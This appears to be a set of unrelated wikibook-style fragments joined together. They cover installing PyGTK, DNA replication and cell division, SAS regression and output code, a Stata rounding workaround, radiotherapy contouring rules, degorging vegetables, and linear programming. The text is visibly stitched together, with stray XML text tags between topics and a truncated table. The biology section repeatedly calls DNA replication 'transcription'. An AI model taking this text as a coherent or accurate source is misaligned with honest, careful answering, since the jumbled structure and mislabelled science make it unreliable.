This book is not a complete reference to the GTK API - that can be found on the [http://library.gnome.org/devel/pygtk/stable/ Gnome website] - nor does it discuss building advanced applications.  Beginners to the subject should feel right at home, but if you are already familiar with PyGTK, take a look at the chapters on Glade and Threading, as they may supplement your knowledge.

== What is a GUI? ==

The way in which users interact with programmes has been revolutionized with the window-based, mouse-driven desktops in modern operating systems, creating greater accessibility and ease of use by the simple 'point-and-click' approach.  A GUI is a window and its collection of widgets - those input boxes, check buttons, radio selections, tabs, text, buttons, and other objects placed inside the window. When the user does almost anything with the window or one of the widgets, even just running the mouse pointer over it, the GUI sends a signal to the programme to alert it that a response may be required.  The Python programming language includes a module for creating basic GUIs in its standard set of libraries, it's named Tkinter, although some don't consider it very elegant in its appearance, nor feature-rich enough in its capabilities. The GTK+ graphical library is a useful alternative.  Whether you intend to write a script to allow the user to perform a simple task such a backing up a few files, or you want to create an advanced RSS reader, creating a GUI is often essential - especially if your intended users may not be familiar with the command line.

GTK+ is the dominant GUI library on the Gnome desktop, so if you are looking to develop applications for the Gnome platform with Python, then knowledge of the PyGTK API is almost certainly necessary.

== Installing PyGTK ==

We assume you already have the Python interpreter (currently v2.6 or later) installed - if not, see the tutorials above.

=== Linux ===

'''Ubuntu Users''' - you already have GTK and PyGTk installed!

'''Other linux distros''' - first test if you have PyGTK installed by opening a Python interpreter and typing `import gtk`. If there is an ImportError, then you need to install the module; otherwise it is already installed.

'''Installing PyGTK'''

[[File:Screenshot-pygtk-packagemanager.png|right|thumb|400px|Installing PyGTK from the Synaptic Package Manager.]]

The easiest way to install PyGTK is to use your system's package manager to download and install `python-gtk2` (see screenshot).  This should automatically sort out all GTK dependencies.  Once completed, test that it has been installed properly by typing `import gtk` in a Python interpreter - if there are no errors, then you're good to go.

An alternative way to install PyGTK on linux is to build it from source.  Download `pygtk-2.14.1.tar.gz` from [http://ftp.gnome.org/pub/GNOME/sources/pygtk/2.14/ ftp.gnome.org], extract the archive and read the `INSTALL` file for instructions on building.  You must also make sure you compile any dependencies, for example GTK, before compiling PyGTK.

=== Windows ===

1- Delete any old or partial installations before installing the new packages &lt;br&gt;
2- Install Python using the windows installer. Example: &lt;I&gt;python-2.7.1.msi&lt;/I&gt;&lt;br&gt;
3- Install the &quot;all-in-one&quot; package using the windows installer. Example: &lt;i&gt;pygtk-all-in-one-2.22.5.win32-py2.7.msi&lt;/I&gt;&lt;br&gt;
That's it. You're done.

The following original instructions did not work but the above procedure from a user group did the job. I have left them here so the author can revise them.&lt;br&gt;
The best way to install PyGTK on windows is to download the GTK and PyGTK binaries.  First, download `gtk+-bundle_2.18.7-20100213_win32.zip` from [http://ftp.gnome.org/pub/GNOME/binaries/win32/gtk+/2.18/ ftp.gnome.org], extract and copy to a suitable folder in your system.  You will then need to add the `bin` subfolder to the system path.

Then download `pygtk-2.16.0+glade.win32-py2.6.exe` from [http://ftp.gnome.org/pub/GNOME/binaries/win32/pygtk/2.16/ ftp.gnome.org], and run the installer wizard.  Once completed, test that it has been installed properly by typing `import gtk` in a Python interpreter - if there are no errors, then you're good to go.

      <text xml:space="preserve">==Introduction==
All cells contain the complete genetic code of the entire organism, but there are several different kinds of cells. The differences depend on which genes get expressed by the cell.
During the development process different cells are 'guided' into different functions and arranged into different patterns. In the mature organism, some of the cell types such as the hemopoetic cells, most connective tissue and epithelial cells continue dividing on a regular basis, others such as the liver cells are capable of division, but rarely do, and others such as the muscle cells and neurons do not divide, or if they do they divide rarely. Cell division is regulated by several regulators called '''proto-oncogenes''' which, because of they importance in cancer studies,  are the subject of intensive investigation. For the same reason natural cell death - '''apoptosis'''- is also the subject of intensive study.

Cell division in eukaryotes has important differences to cell division in prokaryotes, and these differences are taken advantage of by antibiotics. For this reason, and the fact that much of the research on DNA replication has be carried out on E Coli, we will be looking briefly at cell division in prokaryocytes.

===Forming a DNA strand===
As we saw in the biochemistry section (Nucleic Acids) DNA consists of two anti-parrellel strands of Nucleic acids arranged as a Double Helix(fig.3). The following is a recap of the formation and replication of DNA. See the Biochemistry section for the full chemical formulars.

&lt;div style='border: 1px solid black;width:300px;margin:50px' align='center' &gt;
&lt;div&gt;[[File:DNA Overview.png|100px]]&lt;/div&gt;
&lt;div&gt;'''Fig.1.''' ''Model of the double Helix of DNA''&lt;/div&gt;
&lt;/div&gt;

The spine of the strand consists of Deoxyribose  and phosphate molecules linked by a phosphodiester bonds (Fig.2).




[[File:DNA synthesis EN.png|400px]]
&lt;div style='width:500px'&gt;'''Fig. 2.''' ''Addition of a new nucleotide to the growing DNA strand catalyzed by the enzyme DNA polymerase. Cleavage of pyrophosphate bond powers the reaction.''&lt;/div&gt;

The strands are linked together by hydrogen bonds (Fig.3). The links are always between thymine and adenine nucleic acid molecules and guanine and cytosine molecules.

[[File:Dna strand.png|400px]]

&lt;div style='width:500px'&gt;'''Fig. 3.''' ''a DNA Strand combined with a reverse strand. They are held together by '''Hydrogen Bonds''' (the dotted lines) between complementary nucleic acids''&lt;/div&gt;

In eukaryotic cells the enzyme DNA polymerase catalyses the reaction. First the nucleic acid is matched to the parental chain, and then a phosphodiester bond is formed. Note that there are ''three hydrogen bonds'' between guanine and cytosine, and only ''two bonds'' between thymine and adenine.

===Transcribing DNA===
During cell division a new strand of DNA is transcribed from the parental strand. The enzyme δ-DNA polymerase catalyses the reaction by attaching a matching nucleic acid to the exposed 3' hydroxyl group. The Enzyme does not disengage and reattach with each nucleic acid: it is said to be '''highly processive'''.


&lt;div style='width:450px'&gt;'''Fig. 4.''' ''δ DNA polymerase catalyses the addition of Nucleic Acids to the exposed 3' hydroxyl.group. First the triphosphate is matched to the base of the parental strand - in this case thyamine triphosphate is matched to adenine , then a phosphodiester bond is formed with the existing transcribed strand''&lt;/div&gt;

==Chromosomes and Genes==

The human Diploid cell has 22 matching chromosomes and 2 sex chromosomes (Fig.4). One set is inherited from the father and one from the mother. Genes are arranged in a linear fashion along each chromosome. A haploid cell - either a sperm or an ovum contains 23 chromosomes. Fusion of the two cells in fertilization produce the stem cell from which all the diploid cells are made. In genetics a gene is a fundamental unit of hereditary, in biochemical or structural terms it is a sequence of DNA which can manufacture a single protein or RNA sequence. 


[[File:DNA human male chromosomes.gif|400px]]

&lt;div style='width:400px'&gt;'''Fig. 5.''' ''DNA, human male chromosomes''
&lt;/div&gt;
The cell contains about 6 Billion nucleic acid base pairs divided into 46 chromosomes. The DNA in each chromosome is a single molecule between about 3 and 7 cms long. The total length of the DNA in a cell is about 2 meters. The question is how is all this packed into a single nucleus.

===Chromosome Structure===
The Chromosome is formed by wrapping DNA round a a double complex of  4 proteins (8 in all) called histones.

[[File:Nucleosome.jpg|300px]]

'''Fig. 6.''' ''DNA wrapping round histones''

This results in  super coiled strands of DNA:

[[File:30nm Chromatin Structures.png|400px]]

&lt;div width='400'&gt;'''Fig. 7''' ''In this illustration the histones have been removed to show how the DNA is coiled.''&lt;/div&gt;

In the interphase of cell production the strands exist as chromatin; in the prophase the strand and its transcribed copy will join at the centromere; and during metaphase the chromatin will become will become coiled into its chromosomal form

[[File:Chromatin_chromosome.png]]

&lt;div width='500'&gt;'''Fig. 8''' ''Different levels of DNA condensation. (1) Single DNA strand. (2) Chromatin strand (DNA with histones). (3) Chromatin during interphase with centromere. (4) Condensed chromatin during prophase. (Two copies of the DNA molecule are now present) (5) Chromosome during metaphase.''&lt;/div&gt;

The following illustration summarises the process in graphic form:

[[File:Chromosome.gif]]

&lt;div width='500'&gt;'''Fig. 9''' ''Summary diagram of a chromosome, showing how DNA wraps round histones, and how the histones themselves are coiled and arranged to form the chromosome seen in mitosis. Before the 'H' shaped chromasome is formed, the coiled DNA is seen as '''chromatin''' in the nucleus''&lt;/div&gt;
===Genes===
We will consider genes in some detail when we look at gene expression. For now note that the human genome contains about 35,000 genes contained in different chromosomes. Note that there are really two definitions of a gene. The '''Mendelian definition''' - coined before it was even understood that DNA was the mechanism by which inheritence took place - which considered a gene to carry a unique in heritable trait, and the definition that is used in biochemistry - a stretch of DNA which is capable of creating a functioning protein or a functioning strand of RNA.

==The Cell Replication Cycle==
Briefly cell division consists of four stages:

*The cell manufactures the material necessary to duplicate its DNA
*It duplicates its DNA
*It manufactures the materials necessary to build a new cell
*The cell divides (mitosis)

This is illustrated Graphically below:

[[File:Eukaryotic replication cycle.png|300px]]

'''Fig. 10.''' ''Eukaryotic Replication Cycle''

Note that the most visible part of the replication cycle - mitosis - is in fact only a small part of a much larger process. The longest part is the '''G1 phase''' where the cell manufactures all the proteins and RNA to produce a new cell and a duplicate set of DNA. The '''S phase''', the duplication of the DNA takes 6-8 hours, and the final phase before mitosis, the '''G2 phase''' manufactures all the structural elements that the duplicate cell will need.

==DNA replication==
Replication of the chromosome is accomplished by the two strands splitting apart, and each strand acting as a template for a new DNA strand. Each parental strand thus acts as a template for a new strand running in the opposite direction to create a new chromosome. This replication is said to be semi-conservative, i.e. the parental strands are conserved, and each one is paired with a newly synthesised strand. The backbone of each strand consists of Phopho-Ribose part of the nucleic acid being joined to each other by phosphodiester bonds. The phosphate molecule, attached to the 5' carbon ribose atom attaches to the hydroxy molecule at the 3' ribose carbon molecule. (Fig.5). These carbon atoms are also used to name the orientation of the DNA strand, being 5' at one end, and 3' at the other.



The replication process starts by numerous 'bubbles' forming in the DNA as the strands split apart. (Fig.6). The formation of the bubbles allows replication to procede at numerous sites in the DNA molecule, thus speeding up the replication process. At each end of the bubble a 'replication fork' is formed. One strand of the fork has is nearest the 5' end of its DNA strand and the other is nearest to the 3' end of its strand. The DNA strand that runs from 3' to 5' - the 5' being closest to the replication fork being is called the leading strand, and the DNA strand that runs the other way is called the lagging strand.

[[File:DNA_bubbles2.png]]

'''Fig 11.''' ''Bubbles forming in the DNA molecule.''

===Unwinding of parental strands===
The formation of the fork is under the control of two enzyme groups, the topoisomerases and the helicases. Helicase splits hydrogen bond and unwinds the DNA; topoisomerases   takes up the stress of the unwinding by breaking then rejoining the phosphodiester bonds. At each nucleic acid of an unpaired base 'single strand binding proteins' are formed to prevent the strand being split up, or the exposed nucleic acids from being degraded. (Fig.7)

[[File:replication_complex_a.png|400px]]

'''Fig 12.''' ''Formation of a replication fork''

===Lengthening the Transcribed DNA strand===
'''δ-DNA polymerase''' can only add to an existing chain, it cannot initiate transcription. Initiation is accomplished using a strand of RNA known as '''RNA primer'''. This is attached to the parental strand at the initiation point. Two enzymes are involved - '''primase''' and '''α-DNA polymerase'''. Primase attaches a primer of about 7-8 nucleic acids, and α-DNA polymerase then begins the process of attaching nucleic acids. α-DNA polymerase is not nearly as '''processive'''  as δ-DNA polymerase, so once the initiation has been made δ-DNA polymerase takes over and simply adds nucleic acids to the exposed 3' hydroxyl group of transcribed chain.
 
The leading parental strand, that which goes from 3' to 5', can be transcribed continuously from the initiation point until it meets the next 'bubble' along the chain - marked by the existence of a strand of primer. Once the RNA primer has been applied it is just a matter of adding nucleic acids to the exposed 3' hydroxyl group of the transcribed chain. The δ-DNA polymerase does not need to dis- and re-engage for each nucleic acid, but stays attached untill it reaches a stretch of RNA primer. The δ-DNA polymerase is said to be highly '''processive''' and this speeds up the rate of duplication

[[File:Leading strand replication.png|500px]]

&lt;div style='width:500px'&gt;'''Fig. 13 - Duplicating the leading strand'''&lt;br /&gt; ''A primer strand of RNA is added to the parental strand catalyzed by the enzymes '''primase''' and '''α-DNA polymerase'''. Nucleic acids are then continuously added catalyzed by '''δ-DNA polymerase'''. The '''single stranded binding proteins''' are removed as transcription proceeds. The transcription proceeds towards the replication fork''.&lt;/div&gt;

The lagging strand cannot be transcribed continuously, but must be done in stages. As soon as a suitable length of the parental lagging strand has been exposed, initiation of transcription begins as described above using an RNA primer. Transcription is then carried out in the usual manner, ''away from the replication fork'', and continues until it meets the next fragment. Thus the lagging strand is made in fragments - called '''Okazaki Fragments''' after scientist who first described them. 

[[File:Replication complex.png|500px]]



&lt;div style='width:500px'&gt;'''Fig. 14 - Duplicating the lagging strand'''&lt;br /&gt; ''Okazaki framents are formed by adding a  primer strand of RNA catalyzed by the enzymes '''primase''' and '''α-DNA polymerase'''. Nucleic acids are then  added catalyzed by '''δ-DNA polymerase''' untill a previously added Okazaki is reached. The '''single stranded binding proteins''' are removed as transcription proceeds. Not the transcription proceeds away from the replication fork''.&lt;/div&gt;

===Removing the RNA Primer===
When another Okazaki fragment is reached, the RNA primer is removed by δ-DNA polymerase assisted by the enzyme '''flap endonuclease'''; the gap left by its removal is filled by '''repair DNA polymerase'''; and the strands are ligated by DNA Ligase. This is summarized in the illustration below.

[[File:RNA primer.png|550px]]

&lt;div style='width:550px'&gt;'''Fig. 15 - Removing RNA Primer'''&lt;br /&gt; ''The RNA primer is removed, the gap between Okazaki framents is filled using repair DNA polymerases, and the fragments are joined using DNA ligase''.&lt;/div&gt;

===The 3' overhang problem===
As the replication approaches the end of the chromosome, a problem occurs in the lagging strand. DNA polymerase can only add nucleic acids to the 3' end of the strand, so when the last Okazaki frament is formed in the lagging, there is no way that than the RNA primer can be reconstituted in the normal manner. When the RNA primer breaks down we are left with an 'overhang' at the 3' end of the parental chain and shortening of the transcribed chain. This is illustrated below:

[[File:Dna parental3 overhang.png|500px]]

&lt;div style='width:500px'&gt;&lt;b&gt;Fig 16.&lt;/b&gt;&lt;i&gt;Removal of the terminal RNA primers in the lagging strands results in loss of nucleic acids&lt;/i&gt;&lt;/div&gt;

Without a remedy, this state of affairs can lead to chromosome shortening with each cell division, and the possible loss of essential genes. How can this state of affairs be remedied. For the answer we must look to telomers.

===Telomeres and Chromosome shortening===
(''There is much current research into telomeres because of their important role in aging and cancer, and the following description is an outline only of the subject.  [[http://en.wikipedia.org/wiki/Telomeres|&quot;See wiki article telomeres&quot;'']])

Telomeres are the ends of the eucaryotic chromosome. In humans they consist of numerous (in young humans this can number several thousand bases)repeats of the nucleic acid sequence '''TTAGGG''' and its complements. This is the first protection against degradation of the chromosome by overhang. The DNA being shed is merely the non-functional telomere, the TTAGGG sequence. However sooner or later the telomeres will be used up, and the chromosome will start shedding important genes. When this happens, the cell will usually die.

To overcome this problem, certain cells exhibit '''telomerase''' activity. Telomerase is a combination of a ''reverse transcriptase'' type enzyme, and an RNA strand, complementary to the telomere sequence. Telomerase will induce formation of the telomere DNA at the overhanging 3' end, adding nucleic acids to the 3' hydroxyl group. When enough telomeres have been added, primer is added, and DNA polymerase will transcribe the telomere strand similar to the action already described for Okazaki fragments. The fragments are joined by ligase. This is shown in the following illustration. 

[[File:Telomerase.png|550px]]

&lt;div style='width:550px'&gt;&lt;b&gt;Fig 17: Action of Telomerase&lt;/b&gt;&lt;br /&gt;'''1.''' ''The enzyme induces telomeres to be added to the 3' overhang using its own complementary RNA strand.''&lt;br /&gt;'''2.''' ''When sufficient telomeres have been added, an RNA primer is attached, and DNA polymerase transcribes the existing DNA strand consisting mainly of telomeres.''&lt;br /&gt;'''3.''' ''The fragments are joined by Ligase in the usual manner.''&lt;/div&gt;

Telomerase is not active in most cells although it is active in stem cells, germ cells, hair follicles and in 90 percent of cancer cells.

===Telomeres and Aging===
Telomere length is related to aging - older subjects by and large have shorter telomeres - and short telomeres appear to be particularly associated with 'cardia age'. Other factors also affect telomere length and this is the subject of much ongoing research. 
===Telomeres and Cancer===
Telomerase is active in 90% of cancer cells, and must be active to confer 'immortality' on the cancer cell. Those cancer cells that do not have telomerase activity probably employ an alternative telomere lengthening process called '''alternative lengthening  of telomeres (ALT)''', a non-conservative telomere lengthening pathway involving the transfer of telomere tandem repeats between sister-chromatids.

===DNA Polymerases in Eucaryotes===
At least 9 DNA polymerases have been discovered (Together with 3 for procaryotes). Thes all have different functions, and they all assist in DNA repair.

&lt;tr valign='top'&gt;&lt;td&gt;Pol κ, η, ζ, ι&lt;/td&gt;&lt;td&gt;DNA repair (bypass polymerase)&lt;/td&gt;&lt;/tr&gt;


&lt;/table&gt;

Table 1. Eukaryotic DNA Polymerases.

===DNA Repair===
DNA transcription is a complex process and is subject to error. As well as this there are numerous mutagenic effects that also operate to degrade DNA. Without an effective repair mecanism, these would accumulate, and the cell would soon be in trouble!

The δ-DNA polymerase enzyme has a 'repair' mechanism. As the δ-DNA polymerase adds nucleic acids, it audits them to make sure that
*The match is correct
*There is not a mutation to the nucleic acid.
If there is it pauses, and corrects the problem. Thus at the end of duplication of the strand there is only about one error in 10&lt;sup&gt;6&lt;/sup&gt; base pairs. If the repair mechanism of δ-DNA polymerase is blocked, there is an error rate of about 10&lt;sup&gt;3&lt;/sup&gt;

However other DNA polymerases are acting to to audit and repair the DNA, and these reduce the error rare to between 10&lt;sup&gt;9&lt;/sup&gt; and 10&lt;sup&gt;12&lt;/sup&gt;. A remarkable fidelity!

There are several repair mechanisms, but they all follow the same basic pattern:
* The damaged portion of the chain is identified.
* The damaged portion is excised using endo- or exonucleases
* The removed portion is replaced using repair DNA polymerase
*The remaining 'nick' is repaired using DNA ligase.
This is shown in the following illustration.

'''Fig 18.''' ''Repair of a damaged strand of DNA''

====DNA Mutations====
There are numerous environmental and other factors that can cause mutations. The following just mentions a few of the most common ones. Chemicals that cause mutations are called '''Mutagens'''. The sub-group that causes cancer are called '''Carcinogens'''.

[http://en.wikipedia.org/wiki/Carcinogens &quot;(wikipedia article on carcinogens)&quot;]

One of the first chemical carciogens to be identified was '''Benzopyrene''', a product of tobacco smoke. Benzopyrene is oxidized in the cell, and then can combine with nucleic acids causing a disruption in the DNA molecule.

[[File:Benzopyrene guanine.png|300px]]

'''Fig 19.''' ''Oxidized Benzopyrene molecule attached to Guanine''

[[File:Benzopyrene DNA adduct 1JDG.png|300px]]

'''Fig 20.''' ''DNA model of Benzopyrene molecule attached to nucleic acid''

Other common causes are radiation and ultraviolet light. These can generate '''hydroxyl''' radicals in the cell which can react with DNA, either altering the nucleic acids, or cleaving the DNA strand.

These mutations represent '''point mutations'''. Other mutations are caused by rearrangment of the chromosomal material. (See 'Genetic Rearrangement') below.

[[File:Types-of-mutation.png]]

'''Fig 22.''' ''Five types of chromosmal mutations''

More on mutations can be found at the wikipedia article
[http://en.wikipedia.org/wiki/DNA_mutations &quot;mutation&quot;]

==Mitosis==
Mitosis is the visible part of cell division. (See fig. 10). By the time mitosis begins all the 'heavy lifting' in the form of DNA replication and production of elements necessary for division has already been done.

[[File:Mitosis.png]]
 

At the start of mitosis, the duplicated DNA exists as chromatin joined at its centromere (See fig. 8:4), but has not yet been packaged into its chromosomal form.

'''Early Prophase'''. The ''Centiole'' divides, and the chromatin starts to condense. The centrioles are pushed to the poles of the cell by growth of microtubles and actin strands which appear as the 'spindles' under light microscope. The star like configuration, the ''asta'' that surounds the centrioles is also made up of microtubules and actin strands.

'''Late Prophase'''. The Chromatin condenses into chromosomes (Se figs. 8 &amp; ( above) The Nuclear membrane dissipates, and the chromosomes attach them selves to the spindles

'''Metaphase'''. The chromosomes align along the equator.

'''Anaphase'''. The chromosomes dvide at their centromere, and start to 'walk' along the spindles to their respective poles.

'''Telophase'''. The nuclear membranes reform round the chromosomes; the chromosomes unwind to form chromatin (See fig 8:2); the cell constricts; and two new cells are formed.

The cell now either renters the G0 or G1 phase of cell replication.

Further details can be found at the [http://en.wikipedia.org/wiki/Mitosis &quot;Wiki entry on Mitosis&quot;]

==Meiosis==
Meiosis only occours in Germ cells, and produces '''ova''' in females and '''sperm''' in males. In the process of meiosis, the genetic material is reshuffled, and the chromosomes are reduced to their '''haploid''' number. During fertilisation when the ovum and sperm unite, the '''diploid''' number is restored. 

We will revisit miosis when we look at reproductive physiology, but will also look at it here to see how genetic rearangements occour in prophase I of meiosis.

== The linear model ==

* '''proc reg'''
* One can also use the '''proc glm'''
* The least square estimator can be programmed using the IML procedure. See [[SAS/IML#Least_Squares_in_SAS.2FIML | Least Square in IML]] section.

The &lt;tt&gt;model&lt;/tt&gt; instruction gives the model. The outcome is on the lefthandside of the &lt;tt&gt;=&lt;/tt&gt; sign. All explanatory variables are on the right handside. The constant is included by default. 
* Note that the '''proc reg''' is an ''interactive'' command. Therefore you have to add ''quit;'' after the command.

&lt;source lang=&quot;SAS&quot;&gt;
proc reg data = mylib.mydata ;
model y = x1 x2 x3;
run; quit;
&lt;/source&gt;

* The &lt;tt&gt;clb&lt;/tt&gt; option in the &lt;tt&gt;model&lt;/tt&gt; statement gives the 95% confidence interval.

&lt;source lang=&quot;SAS&quot;&gt;
 proc reg data = data_name;
 model y = x1 x2 x3 /clb;
 run;
 quit;
&lt;/source&gt;

* The test statement adds tests for linear hypothesis.
* the output statement creates a table with the residuals.

&lt;source lang=&quot;SAS&quot;&gt;
 proc reg data = data-name;
 model y =x1 x2 x3;
 test x1=1, x1+x2 = 0;
 output out=est residual=resid yhat = predicted;
 run;
 quit;
&lt;/source&gt;

You can also store parameters in a new database : 

&lt;source lang=&quot;SAS&quot;&gt;
proc reg data=data_name outest=est; 
model y = x ; 
run ; 
quit ;
proc print data=est ; 
run ;
&lt;/source&gt;

* Output the main calculation steps :

&lt;source lang=&quot;SAS&quot;&gt;
proc reg data = base ; 
model y = x / I XPX  ; 
run ; quit ; 
&lt;/source&gt;

== Robust Regressions ==

&lt;source lang=&quot;SAS&quot;&gt;
proc robustreg data=lib.ficus (where =(effec &gt; 0 &amp; effec &lt; 100)) method=m (wf=huber)  ;
   model eff_moy = effec; 
   output out = robustreg  weight = wgt;
run; quit ;
&lt;/source&gt;

=== See Also ===

* [http://www2.sas.com/proceedings/sugi27/p265-27.pdf The Robustreg Procedure]

== Instrumental Variables ==

You can perform 2 stage least square estimation with a 'proc syslin' and the '2sls' option. You specify the endogenous predictors in the endogenous statement, the instrument in the instruments statement and your model in the model statement.

&lt;source lang=&quot;SAS&quot;&gt;
proc syslin data = endogen 2sls ; 
endogenous x1 ; 
instruments z1 ; 
model y = x1 ; 
run ; quit ; 
&lt;/source&gt;


== Panel data ==

== Weaving ==

See Lenth RV, Hojsgaard S. 2007. SASweave: Literate programming using SAS. Journal of Statistical
Software 19: 1{20. URL http://www.jstatsoft.org/v19/i08/

== Output Delivery System ==

With the output delivery system (ODS), you can store objects in various formats. ODS offers a set of methods for converting standard output to variouw destinations. 
; Listing : The standard SAS output window
; RTF : Microsoft Office Documents
; LaTeX : The markup language for scientific publication. 
; HTML : to write web pages.
; Output : SAS datasets.

You can see the current settings for each ODS destination by using the ODS SHOW statement : 
&lt;source lang=&quot;SAS&quot;&gt;
ods output show ; 
ods listing show ; 
&lt;/source&gt; 

=== ODS TRACE ===

For each PROC, you can see the list of exportable objects by using the 'ODS TRACE' statement : 
&lt;source lang=&quot;SAS&quot;&gt;
ods trace on/listing;
proc freq data=sashelp.class;
   table age sex;
run;
ods trace off;
&lt;/source&gt;

=== ODS OUTPUT ===

You can export objects to SAS datasets
&lt;source lang=&quot;SAS&quot;&gt;
ods exclude all;
ods output onewayfreqs=exemple_ods (keep=age frequency percent);
proc freq data=sashelp.class;
   table age;
run;
ods output clear;
ods exclude none;
&lt;/source&gt;

== Why use SAS ?==

* SAS works directly on the data sets without loading them into memory. This allows you to manipulate large database such as census data sets.

== Why not use SAS ? ==

* SAS is not available for mac users
* SAS is proprietary and expensive. You may prefer [[R]] which is open-source and cross-platforms.
* There is no systematic syntax. The syntax is specific to each '''PROC'''.

== Alternative to SAS == 

* R : an open source statistical package
* [[Stata]] : includes the very latest econometric methods
* SPSS : an easy to use statistical software

== SAS Environment ==

; EDITOR (F5) : This is a text editor with syntax highlighting where you write your program. You can save your program with the ''.sas'' extension.  
; LOG (F6) : includes all information about the computing process such as errors, warnings, computing time (cpu). You can save it with the ''.log'' extension. 
; OUTPUT (F7) : This includes all the results. You can save it with the ''.lst'' extension. 
; EXPLORER (CTRL +D) : browse all your SAS libraries and open datasets in the SAS data editor.
; HELP (F1) : Help system.

== SAS Programming Style ==

* SAS includes ''procedures'' and ''data'' step. ''data'' steps generally create a new dataset and ''procedure'' step compute some quantity of interest using existing data.  
* Each step is ended with the '''run ;''' statement.
* Semicolons ''';''' are end of statement delimiter. 
* SAS works directly on a database without loading it into memory. This facilitates manipulation of large databases.
* '''F3''' executes the current program or the selected lines of the program.
* After executing a program, you first look at your log and then you can have a look at your results.
* Comments begin with a star and terminated by a semicolon or are contained within a slash-star and a star-slash c-style block comment: 
&lt;source lang=&quot;SAS&quot;&gt;
* This is a comment ; 
/*This is also a comment */
&lt;/source&gt;
* SAS is not case sensitive (&quot;a&quot; and &quot;A&quot; are similar to SAS)

== Preamble == 

The following lines are often useful at the beginning of a SAS program : 

* Libname : It is often useful to defines libname. A libname is nothing more than an alias for a directory. 
&lt;source lang=&quot;SAS&quot;&gt;
libname lib_name 'c:/data/ee';
&lt;/source&gt;
* Options : the following line in head of a program makes it easier to read the log. 
&lt;source lang=&quot;SAS&quot;&gt;
options errors=1 noovp pageno=1 ls=78;
&lt;/source&gt;
* Clean log and output windows : At the beginning of a program it is often convenient to clean the log and the output: 
&lt;source lang = &quot;SAS&quot;&gt;
dm &quot;CLEAR LOG ; CLEAR OUTPUT ; &quot; ;
&lt;/source&gt;
''dm'' stands for &quot;Display Manager&quot;</text>

Report your problems with Stata on this page : 


= Round = 

Sometimes the round() function does not perform its job.
For instance, in this case round does not change anything to the value of the local ''toto''. 

 . local toto = 9.950000000000001
 . di &quot;`toto'&quot;
 9.950000000000001
 . local toto2 = round(`toto',.01)
 . di &quot;`toto2'&quot;
 9.950000000000001

The temporary solution to this problem is to treat ''toto'' as a string and to use ''regexm'' to round it : 

 . local toto = 9.950000000000001
 . di &quot;`toto'&quot;
 9.950000000000001
 . if regexm(&quot;`toto'&quot;,&quot;([0-9].[0-9][0-9])&quot;){
 .         local toto = regexs(1)
 .         di &quot;`toto'&quot;
 9.95
 .         }</text>

*Dmax: 0.03 cc is approximately 3 mm x 3 mm x 3 mm cube
*Bladder [0534]: should be contoured from its base to the dome, excluding the CTV1 (the CTV1 includes the bladder neck).
*Femoral head [0534]: should be outlined down to the interface between the greater and lesser trochanters
*Rectum [0534]: should be contoured from the anus (at the level of the ischial tuberosities) to the rectosigmoid flexure (this is roughly at about 10 cm) or for a maximum length of 15 cm if the sigmoid flexure if felt to be higher
*Spinal cord [0631]: The spinal cord should be contoured starting from 5-6 mm above the superior extent of the target volume to 5-6 mm below the inferior extent of the target volume. The spinal cord should be drawn on every slice of simulation CT. The variation of 5-6 mm is due to the pre-determined slice thicknesses of 2.5-3 mm by different CT manufacturers.</text>

'''Degorging''' is a the process of drawing out a vegetables moisture before cooking.  It is a method often used to remove bitterness (due to a buildup of toxins) from an item.   To degorge vegetables, cut the vegetable into skinned slices or cubes, then soak in heavily salted water, or sprinkle salt directly onto the vegetable and allow it to 'sweat'.   Make sure to rinse the vegetable well before cooking.   Degorging vegetables can reduce oil absorption of the vegetable, which may affect the fat content of sauces.

Degorging can also refer to removing an ice plug of yeast from a bottle of alcohol, especially champagne.

      <text xml:space="preserve">== Linear Programming ==
Linear programming is a method that is used to find a minimum or maximum value for a function.  That value is going to satisfy a known set of conditions ''constraints''.  Constraints are the inequalities in the linear programming problem.  Their solution is graphed as a ''feasible region'', which is a set of points.  These points are where the graphs of the inequalities intersect.  And, the region is said to be bounded when the graph of a system of constraints is a polygonal region.

There are 7 steps that are used when solving a problem using linear programming.

'''1. Define''' the variables.

'''2. Write''' a system of inequalities.

'''3. Graph''' the system of inequalities.

'''4. Find''' the coordinates of the vertices of the feasible region.

'''5. Write''' a function to be maximized or minimized.

'''6. Substitute''' the coordinates of the vertices into the function.

'''7. Select''' the greatest or least result.  '''Answer''' the problem.

Many types of real-world problems can be solved using linear programming.  These problems have restrictions placed on the variables.  Some function of the variable must be maximized or minimized.

One Company sells two different products A and B, making a profit of Rs.40 and Rs.30 per unit, respectively. They are both produced with help of common production process and are sold in two different markets. The production process has a total capacity of 30000 man - hours. it takes 3 hours to produce an unit of A and one hour to produce an unit of B. The market has been surveyed and company officials feel that the maximum number of units of A that can be sold is 8000 units and that of B is 12000 units. Subject to those limitations; products can be sold in any combination. Formulate this problems as an Linear Programming Model to maximize profit.

== Objective Function ==
Sometimes, in linear programming problems, identifying the feasible region is not the only thing necessary to be done.  To maximize or minimize the function, the best combination of values must be found.  This is what the objective function does.  It can either have a maximum value, a minimum value, both, or neither.  It all depends upon the feasible region.  

There are two different general types of regions: bounded and unbounded regions.  '''Bounded feasible regions''' have both a minimum and a maximum value.  '''Unbounded feasible regions''' have either a minimum or maximum value, never both.  The minimum or maximum value of such objective functions always occurs at the vertex of the feasible region.  This mathematical idea, however, is a proof that is for more advanced mathematics.

== Bounded Region Example ==
'''Graph''' the following system of inequalities.  '''Name''' the coordinates of the vertices of the feasible region.  '''Find''' the maximum and minimum values of the function f(x,y) = 3x + y for this region.  
x &lt;u&gt;&gt;&lt;/u&gt; 1

y &lt;u&gt;&gt;&lt;/u&gt; 0
2x + y &lt;u&gt;&lt;&lt;/u&gt; 6

'''1. Find''' the vertices of the region.  '''Graph''' the inequalities.  

The polygon formed is a triangle with vertices at (1, 4), (3, 0), and (1, 0).  

'''2. Use''' a table to '''find''' the maximum and minimum values of f(x, y).  '''Substitute''' the coordinates of the vertices into the function.  The maximum value is 9 at (3, 0).  The minimum value is 3 at (1, 0).  


== Unbounded Region Example ==
'''Graph''' the following system of inequalities.  '''Name''' the coordinates of the vertices of the feasible region.  '''Find''' the maximum and minimum values of the function f(x, y)= 5x + 4y for this region.  

2x + y &lt;u&gt;&gt;&lt;/u&gt; 3

3y - x &lt;u&gt;&lt;&lt;/u&gt; 9

2x + y &lt;u&gt;&lt;&lt;/u&gt; 10

'''Graph''' the system of inequalities.  There are only two points of intersection: (0, 3) and (3, 4).  

The maximum is 31 at (3, 4). 

